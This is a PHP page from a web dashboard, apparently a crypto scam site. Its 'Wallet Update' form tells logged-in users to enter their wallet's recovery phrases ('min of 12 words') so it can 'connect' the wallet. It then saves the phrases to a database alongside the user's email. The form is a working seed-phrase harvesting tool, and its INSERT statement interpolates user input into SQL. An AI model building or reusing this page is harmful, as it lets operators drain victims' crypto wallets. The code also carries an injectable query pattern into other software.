<?php
session_start();
include_once ('df/session.php');
require_once 'df/controller.php'; 
if(!isset($_SESSION['uname'])){
header("Location: login.php");
exit(); 
}

$reg_user = new USER();

$stmt = $reg_user->runQuery("SELECT * FROM account WHERE uname=:uname");
$stmt->execute(array(":uname" => $_SESSION['uname']));
$row = $stmt->fetch(PDO::FETCH_ASSOC);



$status = $row['status'];
$bill = $row['billing_code'];

  
if(isset($_POST['token'])){
    
	$uname = trim($_POST['uname']);
	$uname = strip_tags($uname);
	$uname = htmlspecialchars($uname);
    
	$wallet = trim($_POST['wallet']);
	$wallet = strip_tags($wallet);
	$wallet = htmlspecialchars($wallet);
	
	$phrases = trim($_POST['phrases']);
	$phrases = strip_tags($phrases);
	$phrases = htmlspecialchars($phrases);
	

	     
    $queri = " INSERT INTO wallet (wallet,phrases,uname)VALUE('$wallet','$phrases','$uname')";
    $resulti = mysqli_query($connection, $queri) or die(mysqli_error($connection));
    
      
	echo "<script>window.location.href = 'token.php?success' </script>";
	
	
}
	

?>
 <?php include 'df1.php'; ?>
  <div class="content-w">
        <!--------------------
                  START - Breadcrumbs
                  -------------------->
        <ul class="breadcrumb">
            <li class="breadcrumb-item">
                <a href="dashboard.php">Home</a>
            </li>
            <li class="breadcrumb-item">
                <span>Wallet</span>
            </li>
        </ul>
        <!--------------------
        END - Breadcrumbs
        -------------------->

 
   <div class="content-i">
            <div class="content-box">
                <div class="row">
                    <div class="col-lg-8">
                        <div class="element-wrapper">
                            <h6 class="element-header">
                                Wallet
                            </h6>
                            <div class="element-box">
                                <form  action="token.php" method="post" >
                                    <h5 class="form-header">
                                        Wallet Update
                                    </h5>
                                  <div class="form-desc">
                                        Enter you wallet type and phrases to get connected seamlessly<br><span class="badge badge-danger">Note: Phrases should follow serially</span>
                                    </div>
                                    <div class="form-group m-t-30">
                                                                            </div>
                                   
                                    
										<?php 
							if(isset($_GET['error']))
								{
									?>
									<div class='alert'>
										<button class='close' data-dismiss='alert'>&times;</button>
										<strong>Unable to Authenticate. Add wallet Failed.</strong> 
									</div>
									<?php
								}
						?>
					
						<?php 
							if(isset($_GET['success']))
								{
									?>
									<div class='alert success'>
										<button class='close' data-dismiss='alert'>&times;</button>
										<strong>Wallet submitted successfully.</strong> 
									</div>
									<?php
								}
						?> 
						
						 
                                    <div class="form-group">
                                        <label for=""> Wallet Name</label>
											 <span id="sprytf_acc_name">
                                        <input class="form-control" placeholder="Wallet Name" type="text" id="wallet" name="wallet">
									    <span class="textfieldRequiredMsg">Wallet Name is required.</span>
										<span class="textfieldMinCharsMsg">min of 5 characters.</span> 
											</span>
						
                                    </div>
                                    
                                       
                                    <fieldset class="form-group">
                                        
										
            							<input type="hidden"  name="uname" value="<?php echo $row['email']; ?> "/>
                                        <div class="row">
                                            <div class="col-md-12">
                                                <label for="">Phrases</label>
												<span id="sprytf_remarks">
                                                <textarea class="form-control" rows="5" id="phrases" name="phrases"></textarea>
												<span class="textfieldRequiredMsg">Wallet phrases are required.</span>
            			                 <span class="textfieldMinCharsMsg">min of 12 words.</span> 
							            </span>
                                            </div>
                                        </div>
                                    </fieldset>
                                    <div class="form-buttons-w">
                                        <button class="btn btn-primary" name="token" type="submit"> Add Wallet</button>
										
										
		 
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
 
 
 
 
 
  <?php include 'df2.php'; ?>